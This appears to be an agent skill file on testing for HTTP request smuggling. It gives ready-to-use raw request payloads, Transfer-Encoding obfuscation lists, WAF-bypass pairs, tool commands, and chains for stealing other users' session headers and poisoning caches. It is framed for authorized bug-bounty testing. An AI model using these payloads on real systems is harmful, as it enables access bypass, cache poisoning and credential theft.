---
name: http-request-smuggling
description: HTTP request smuggling testing covering CL.TE, TE.CL, TE.TE, CL.0, H2.0, H2.CL, H2.TE, pause-based desync, browser-powered desync, and front-end/back-end interpretation differences
depends_on: []
---

# HTTP Request Smuggling

HTTP request smuggling exploits disagreements between front-end and back-end servers in parsing HTTP request boundaries. Focus on CL.TE, TE.CL, TE.TE obfuscation, CL.0, H2.0, HTTP/2 downgrade desync (H2.CL, H2.TE), pause-based desync, browser-powered desync, and front-end/back-end interpretation differences.

## Discovery Signals

Fingerprints indicating smuggling probability before sending any attack payload.

| Signal | Where to Find | Why Vulnerable |
|--------|--------------|----------------|
| Reverse proxy detected | `Server`, `Via`, `X-Forwarded-By` headers differ from backend fingerprint | Multi-tier = two parsers = potential desync |
| Mixed HTTP versions | ALPN negotiates `h2` but backend responds with HTTP/1.1 headers | H2-to-H1 downgrade translation is a smuggling surface |
| CDN + origin architecture | `X-Cache`, `CF-Ray`, `X-Amz-Cf-Id`, `X-Served-By` headers present | CDN connection pooling enables cross-user smuggling |
| Connection reuse confirmed | Two pipelined requests on same TCP socket both get responses | Keep-alive between tiers means smuggled bytes persist in buffer |
| AJP/FastCGI backend | Port 8009 open, `.jsp`/`.php` extensions, Tomcat/PHP-FPM fingerprint | Protocol translation (HTTP to AJP/FastCGI) adds framing disagreements |
| WAF in front of app | `X-WAF-*` headers, known WAF fingerprints (Akamai, Imperva, Cloudflare) | WAF inspects frontend interpretation; smuggled portion bypasses inspection |
| Demo/staging subdomain | `demo.*`, `staging.*`, `dev.*` subdomains on different infra | Often different proxy config than production, less hardened |
| Transfer-Encoding not stripped | Send `Transfer-Encoding: chunked` with `Content-Length`; both echoed back | Server does not normalize conflicting headers = desync candidate |
| HTTP/2 cleartext (h2c) | `Upgrade: h2c` accepted on plaintext port 80 | h2c upgrade path often bypasses TLS-only proxy restrictions |
| Configurable edge transforms | Cloudflare Transform Rules, AWS CloudFront functions, Akamai EdgeWorkers | Config-to-egress injection: hex escapes or CRLF in config values reach wire |
| Bare CR/LF forwarded | Send `GET\r /` (bare CR after method); get response (not 400) | RFC violation forwarded = parser differential exploitable for cache poisoning |
| Backend timeout differs from frontend | Partial request hangs longer on one tier than the other | Pause-based desync: timeout disagreement = framing disagreement |

## Server-Pair Vulnerability Matrix

Known-vulnerable frontend/backend combinations from disclosed reports and research.

| Frontend | Backend | Variant | Detection Payload | Notes |
|----------|---------|---------|-------------------|-------|
| Cloudflare | nginx/Apache | CL.TE, TE.TE | Standard CL.TE timing probe | Transform Rules concat() hex escapes enable CRLF injection (H1 report #1478633, $6k) |
| AWS ALB | Apache/Tomcat | CL.TE, H2.CL | H2 request with CL:0 + body | ALB downgrades H2 to H1; CL mismatch exploitable |
| AWS CloudFront | Lighttpd/Tornado | Cache poisoning | `GET\r /path` bare CR after method | Negative caching stores 501 for legit URL ($500k Google VRP pattern applies) |
| HAProxy | Gunicorn/Node | TE.CL, CL.TE | TE obfuscation variants | HAProxy strict on CL; Gunicorn lenient on TE parsing |
| nginx | Apache | TE.TE | `Transfer-Encoding : chunked` (space before colon) | nginx ignores malformed TE; Apache processes it |
| nginx | Node.js (llhttp) | CL.TE, TE.TE | Chunk extension with bare LF (`\n` without `\r`) | llhttp accepts bare LF in chunk extensions; nginx strict (H1 #1238099) |
| ATS (Apache Traffic Server) | Node.js | CL.TE | Chunk extension with embedded `\n` | ATS terminates at `\n`; Node terminates at `\r` = framing split |
| Apache mod_proxy_ajp | Tomcat (AJP) | Protocol translation | Conflicting CL/TE in AJP-translated request | Binary AJP framing disagrees with HTTP text framing ($2.4k, CVE-2022-26377) |
| Akamai | IIS | TE.CL | `Transfer-Encoding: chunked, cow` | Akamai honors chunked; IIS falls back to CL on invalid TE value |
| Envoy | Node.js | H2.CL, CL.0 | H2 with mismatched DATA frame length | Envoy H2 gateway trusts DATA frame; Node backend uses CL header |
| Caddy | PHP-FPM (FastCGI) | CL.TE | Standard CL.TE + TE obfuscation | FastCGI translation boundary adds framing disagreement |
| Google Cloud LB | Lighttpd/CherryPy | Bare CR method | `printf 'GET\r /index HTTP/1.1\r\n...'` | LB forwards bare CR; backend returns 501; CDN caches it ($500k bounty) |

## Reconnaissance

**Infrastructure Mapping**
- Identify number of tiers: CDN, WAF, load balancer, application. Check `Server`, `Via`, `X-Forwarded-By`, `X-Cache` response headers.
- Determine HTTP/2 support: try `h2` ALPN negotiation. Test h2c upgrade on port 80.
- Test connection reuse: send multiple requests on same connection, observe behavior.

**Timing-Based Detection (CL.TE)**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1\r\n
Z\r\n
Q
```
If back-end uses chunked: reads chunk `1` (byte Z), then waits for next chunk. Timeout (~10s delay) indicates CL.TE.

**Timing-Based Detection (TE.CL)**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
\r\n
X
```
If back-end uses CL: reads 6 bytes including `X`. Front-end saw chunk terminator at `0`. Timeout or error indicates TE.CL.

## Key Vulnerabilities

### CL.TE Smuggling

Front-end uses Content-Length, back-end uses Transfer-Encoding: chunked. Front-end forwards the full CL-sized body; back-end stops at chunk terminator, leaving remainder on the connection.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0\r\n\r\nSMUGGLED
```
Front-end sends 13 bytes. Back-end reads chunked: `0` terminates. `SMUGGLED` prepended to next request.

**Exploitation**: Smuggle a full second request to bypass front-end access controls:
```
POST / HTTP/1.1
Host: target.com
Content-Length: 128
Transfer-Encoding: chunked

0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: target.com\r\n
\r\n
```
The smuggled `GET /admin` is processed by the back-end as a separate request, bypassing front-end IP restrictions and WAF rules.

### TE.CL Smuggling

Front-end uses Transfer-Encoding: chunked, back-end uses Content-Length. Front-end reads until chunk terminator; back-end reads CL bytes, leaving chunk data in buffer.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8\r\nSMUGGLED\r\n0\r\n\r\n
```
Front-end reads chunks (8 bytes + terminator). Back-end reads CL=3: `8\r\n`, leaves `SMUGGLED...` as next request.

### TE.TE Obfuscation

Both servers support chunked, but one is confused by obfuscated Transfer-Encoding. Goal: make one server ignore TE while the other processes it.

```
Transfer-Encoding: chunked
Transfer-Encoding : chunked          # Space before colon
Transfer-Encoding: chunked\r\nTransfer-encoding: x
Transfer-Encoding: chunked, cow      # Invalid value after comma
Transfer-Encoding:\tchunked          # Tab instead of space
Transfer-Encoding: xchunked          # Prefix
Transfer-Encoding\n: chunked         # Newline in header name
Transfer-Encoding: chunk             # Truncated value
```

### CL.0 / 0.CL Desync

Newer variant (Kettle 2022). Back-end ignores Content-Length entirely for certain endpoints or methods, treating the request as having no body. Front-end uses CL normally.

```
POST /api/ping HTTP/1.1
Host: target.com
Content-Length: 50

GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n
```
Front-end forwards 50 bytes as body. Back-end ignores CL (returns response immediately), leaves 50 bytes in socket buffer as next request. Common on endpoints that don't expect a body (health checks, GETs upgraded to POSTs by proxies).

### H2.CL Desync

Client speaks HTTP/2; front-end downgrades to HTTP/1.1. HTTP/2 DATA frames define body length; front-end may add CL header during downgrade.

```
:method POST
:path /
content-length: 0

SMUGGLED REQUEST HERE
```
Front-end sends full H2 DATA frame as H1 body. If CL:0 is forwarded, back-end sees 0-length body; remaining data is next request.

### H2.TE Desync

HTTP/2 spec prohibits TE:chunked, but some front-ends pass it through during downgrade.

```
:method POST
:path /
transfer-encoding: chunked

0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n
```

### H2.0 Desync

HTTP/2 variant of CL.0. Front-end downgrades H2 to H1 and the back-end ignores the body entirely, leaving it in the connection buffer.

```
:method POST
:path /api/status
:authority target.com

GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n
```
H2 DATA frame carries the smuggled request. Back-end endpoint ignores body content after H2-to-H1 translation. Same as CL.0 but initiated over HTTP/2 connection.

### CRLF Injection via HTTP/2 Headers

HTTP/2 binary framing allows header values that are invalid in HTTP/1.1. During downgrade, CRLF in header values creates new headers or splits the request.

```
:method GET
:path /
foo: bar\r\nTransfer-Encoding: chunked
```

### Pause-Based Desync

Exploits timeout disagreements between front-end and back-end (Kettle 2022 "Browser-Powered Desync Attacks"). No header manipulation needed.

1. Send partial request: `POST / HTTP/1.1\r\nContent-Length: 100\r\n\r\n` + 50 bytes, then **pause**
2. Back-end times out (e.g., Apache `Timeout` 60s), closes parser state or sends 408
3. Attacker resumes sending remaining bytes + smuggled request
4. Front-end pipelines trailing bytes onto the next connection; back-end treats them as new request

Works against targets immune to CL.TE/TE.CL because both sides agree on header parsing. Vulnerable when: front-end timeout > back-end timeout and front-end keeps connection alive after back-end closes.

### Browser-Powered Desync (Client-Side)

Browser's fetch API can trigger CL smuggling without custom TCP sockets. Enables client-side desync attacks via victim's browser.

**fetch() CL smuggling**: Browser sends `Content-Length` with a body, but the server (using HTTP/1.1 keep-alive) disagrees on body length. Remaining bytes poison the next request on the same connection.

**Attack flow**: Attacker hosts page with `fetch('https://target.com/endpoint', {method:'POST', body:'...smuggled...', mode:'no-cors'})`. Victim visits page; their browser sends the smuggling payload; their own subsequent requests to target.com on the same connection are poisoned.

Requires: target accepts cross-origin POST, connection reuse in browser's HTTP/1.1 pool, and a CL.0 or similar desync on the server.

## Detection Payload Matrix

Ready-to-use detection payloads. Timing-based detection is safest for shared infrastructure.

| Variant | Payload (compact) | Vulnerable Behavior | Safe Behavior |
|---------|-------------------|--------------------|----|
| CL.TE | `POST / CL:4 TE:chunked` body: `1\r\nZ\r\nQ` | Back-end timeout waiting for chunk terminator (~10s delay) | Immediate response (both use same parser) |
| TE.CL | `POST / CL:6 TE:chunked` body: `0\r\n\r\nX` | Back-end reads CL=6, processes `X` as next request prefix | Immediate response, no prefix leakage |
| TE.TE | `POST / TE:chunked TE:[obfuscated]` body: standard CL.TE or TE.CL probe | One server ignores obfuscated TE, creating CL.TE or TE.CL desync | Both servers process same TE value |
| H2.CL | H2 request: `content-length:0` + DATA frame with body | Back-end sees CL:0, ignores body; body becomes next request | H2 frame length used, CL ignored |
| H2.TE | H2 request: `transfer-encoding:chunked` + chunked body | Back-end processes chunked despite H2 spec prohibition | Front-end strips TE during downgrade |
| CL.0 | `POST /health CL:50` body: `GET /probe HTTP/1.1\r\n...` | Follow-up request returns probe response instead of expected response | Body consumed normally by endpoint |
| H2.0 | H2 POST to no-body endpoint with DATA frame containing probe request | Same as CL.0 but over H2 connection | Body consumed or connection reset |
| Pause | Send partial POST body, pause 30s, send rest + probe | Follow-up request poisoned after timeout reset | Both tiers timeout identically |
| Bare CR | `printf 'GET\r /path HTTP/1.1\r\n...'` | 501 from backend (treats `GET\r` as unknown method) | 400 Bad Request (rejects bare CR) |

## Defense-Bypass Pairs

| Defense | Bypass Technique | Example |
|---------|-----------------|---------|
| WAF strips duplicate TE headers | TE obfuscation: space before colon, tab, mixed case | `Transfer-Encoding : chunked` passes WAF filter |
| Front-end normalizes CL/TE conflict | H2 downgrade: inject CL in H2 pseudo-headers | H2 content-length:0 with body; front-end can't normalize what H2 framing defines |
| HTTP/2 enforcement (no H1 allowed) | h2c cleartext upgrade on port 80 bypasses TLS-only H2 | `Upgrade: h2c` on non-TLS endpoint; proxy may not enforce H2 rules |
| Connection-per-request (no keep-alive) | Browser-powered desync via fetch() | Browser reuses connections regardless of server's Connection: close header |
| TE header value validation | obs-fold continuation: `Transfer-Encoding: chunked\r\n abc` | Validator checks first line only; parser folds continuation into value (CVE-2022-32213 bypass) |
| Chunk size validation | Chunk extensions with bare LF: `5 \nxx\r\n` | Proxy terminates at `\n`; backend terminates at `\r` = different chunk boundaries |
| CDN-level request normalization | Config-to-egress injection via edge transform rules | Cloudflare Transform Rules concat() hex escapes: `\x0d\x0a` becomes wire CRLF |
| Negative caching disabled | Bare CR method line: `GET\r /path` triggers 501 at backend | Even without negative caching, response queue poisoning still works |

## Chain Patterns

Smuggling is rarely the final impact. It is a primitive that enables higher-severity chains.

| Chain | Steps | Severity Multiplier |
|-------|-------|---------------------|
| Smuggling to cache poisoning | Smuggle request causing attacker-controlled response; CDN caches it for legit URL | Medium to Critical (affects all users of cached resource) |
| Smuggling to credential theft | Smuggle partial request (`Foo: `); next user's headers appended as value; POST to attacker endpoint | High to Critical (mass session hijack) |
| Smuggling to auth bypass | Smuggle `GET /admin`; back-end processes it without front-end auth check | Medium to Critical (depends on admin functionality) |
| Smuggling to WAF bypass to SQLi/XSS | Smuggle payload in back-end request body; WAF only inspects front-end interpretation | Elevates any blocked vuln to exploitable |
| Smuggling to SSRF | Smuggle request with `Host: internal-service`; back-end routes to internal network | High (internal service access) |
| Smuggling to web cache deception | Smuggle request causing victim's private response to be cached under public URL | High (PII/credential exposure at scale) |
| Smuggling to request hijacking | Smuggle prefix that modifies next user's request path/host to attacker endpoint | High (persistent redirect for connection pool users) |
| Smuggling to account takeover | Chain credential theft + cache poisoning: steal session, then persist poisoned login page | Critical (mass ATO) |

## Exploitation Scenarios

**Access Control Bypass**: Front-end restricts `/admin` by IP or auth header. Smuggle `GET /admin` request; back-end processes it without front-end restrictions. Smuggled request inherits connection-level auth from previous legitimate request.

**Web Cache Poisoning**: Smuggle a request that causes back-end to return attacker-controlled content. Front-end cache stores the poisoned response under the legitimate URL. Subsequent users receive the poisoned cached response. Highest blast radius of all smuggling chains.

**Credential Capture**: Smuggle a partial request leaving a header value open (e.g., `Foo: `). Next user's request is appended as the value, including their `Cookie` and `Authorization` headers. POST the captured headers to an attacker-visible endpoint. This is the "mass session hijacking" pattern.

**WAF Bypass**: WAF inspects the front-end's interpretation of the request. Smuggled portion is not inspected by WAF. Inject SQLi/XSS/command injection payloads in the smuggled request body.

## Bypass Techniques

- TE header obfuscation (see TE.TE variants above)
- HTTP/2 pseudo-header manipulation for downgrade desync
- CRLF in HTTP/2 header values (binary framing permits what H1 treats as header separator)
- Chunk extension fields: `a;ext=value\r\n` (parsers disagree on extension byte allowance)
- Trailer headers after final chunk: some servers process, others ignore
- Duplicate CL headers with different values: some servers use first, some use last
- obs-fold header continuation: `Header: value\r\n continuation` (deprecated but still accepted by llhttp, some Apache configs)
- Bare LF (`\n`) without CR in chunk extensions: terminates differently across parsers
- Bare CR (`\r`) in method line: some backends treat `GET\r` as unknown method
- Hex escape injection in edge config: `\x0d\x0a` in Cloudflare/AWS transform rules

## Testing Methodology

1. **Infrastructure mapping** - Identify all tiers, HTTP versions, connection reuse behavior. Check `Server`, `Via`, `X-Cache`, `X-Forwarded-By` headers.
2. **Timing probes** - Use timing-based detection for CL.TE and TE.CL (differential timeout). Safest for shared infrastructure.
3. **Confirmation** - Confirm desync with smuggled request that triggers detectable response difference on follow-up request.
4. **TE obfuscation** - Test all TE variants from the obfuscation list against both CL.TE and TE.CL configurations.
5. **H2 desync** - Test HTTP/2 downgrade scenarios: H2.CL, H2.TE, H2.0, CRLF injection in H2 header values.
6. **CL.0 probing** - Test endpoints that don't expect a body (health checks, status pages, GETs) for CL.0 behavior.
7. **Pause-based** - Send partial request, pause beyond expected back-end timeout, resume. Observe if follow-up request is poisoned.
8. **Bare CR/LF** - Test method-line and header bare CR/LF forwarding for cache poisoning vectors.
9. **Impact demonstration** - Prove access control bypass, cache poisoning, or credential capture.
10. **Safe testing** - Use timing-based detection first. On shared infrastructure, use unique probe paths to avoid poisoning other users' responses.

## Validation

1. Timing confirmation: detectable timeout difference indicating desync between front-end and back-end parsing
2. Response confirmation: smuggled request producing a different response than expected for the follow-up legitimate request
3. Access control bypass: request to restricted endpoint succeeding via smuggling
4. Cache poisoning: poisoned response served to subsequent requests for the same URL
5. Credential capture: another user's headers captured in the body of a smuggled request

## False Positives

- Single-tier architecture (no front-end/back-end split)
- No connection reuse between tiers (each request on new connection)
- Both tiers use identical HTTP parser
- Front-end strips TE when CL is present (or vice versa) consistently
- HTTP/2 end-to-end without downgrade
- Backend returns 400 for all malformed requests (strict RFC compliance)

## Impact

- Authentication and authorization bypass at network/WAF level
- Web cache poisoning affecting all users of the cached resource (up to $500k bounty at Google VRP)
- Credential theft from other users via request hijacking (mass session hijack)
- WAF bypass enabling exploitation of underlying application vulnerabilities
- Cross-user request manipulation leading to persistent attacks
- Cross-tenant cache poisoning on shared CDN infrastructure

## Pro Tips

1. Start with timing-based detection. It is the safest method and confirms desync without affecting other users' requests.
2. Use HTTP Request Smuggler (Burp extension by James Kettle) for automated detection. Trust "Firm" confidence alerts; manually replay "Tentative" ones.
3. Test TE obfuscation variants systematically. The specific variant that works is server-pair-specific. Try all 8+ from the obfuscation list.
4. CL.0 is the most underrated variant. Test every endpoint that does not expect a body: health checks, status pages, favicon, static files.
5. After finding any HTTP CVE patch in a parser, immediately test obs-fold, bare LF, chunk extensions, and continuation lines against the patched version. Patch bypass is the highest-ROI smuggling workflow.
6. Bare CR (`\r`) in the method line is a $500k-class vector when combined with CDN negative caching. Test `printf 'GET\r /path HTTP/1.1\r\n...'` against every CDN-fronted target.
7. Browser-powered desync via fetch() enables client-side smuggling without the victim running custom tools. If CL.0 works on a target, the attack can be triggered from any web page the victim visits.
8. Demo and staging subdomains often have different proxy configurations than production. Test all discovered subdomains, not just the primary domain.
9. Chain smuggling with cache poisoning for maximum impact. A single smuggling primitive + shared cache = every user affected. This is what separates Medium from Critical severity.
10. For config-to-egress targets (Cloudflare Transform Rules, AWS CloudFront functions): test hex escapes (`\x0d\x0a`), unicode escapes, and newlines in every configurable string field that reaches the upstream request.

## Tooling

| Tool | Purpose | Usage |
|------|---------|-------|
| HTTP Request Smuggler (Burp) | Automated CL.TE/TE.CL/TE.TE/H2 detection | Run against all in-scope hosts; triage Firm alerts manually |
| smuggler.py | CLI-based smuggling probe | `python smuggler.py -u https://target.com` |
| h2csmuggler | HTTP/2 cleartext upgrade smuggling | `python h2csmuggler.py -x https://proxy:443 https://target/admin` |
| http-garden | RFC-violation parser fuzzer | Corpus of RFC-forbidden byte sequences for differential testing |
| curl (raw) | Manual probe crafting | `curl -H $'Transfer-Encoding: chunked\r\n abc' --data "A" target` |
| printf + nc | Bare CR/LF injection | `printf 'GET\r /path HTTP/1.1\r\n...\r\n\r\n' \| nc target 80` |

## Summary

Request smuggling exploits disagreements between HTTP parsing implementations in multi-tier architectures. Classic variants (CL.TE, TE.CL, TE.TE) target header conflicts. Newer variants (CL.0, H2.0, pause-based, browser-powered) exploit body-length assumptions, timeout disagreements, and browser connection reuse. Any protocol translation boundary (H2 to H1, HTTP to AJP, HTTP to FastCGI) is a smuggling surface. Chain with cache poisoning or credential theft for Critical impact.
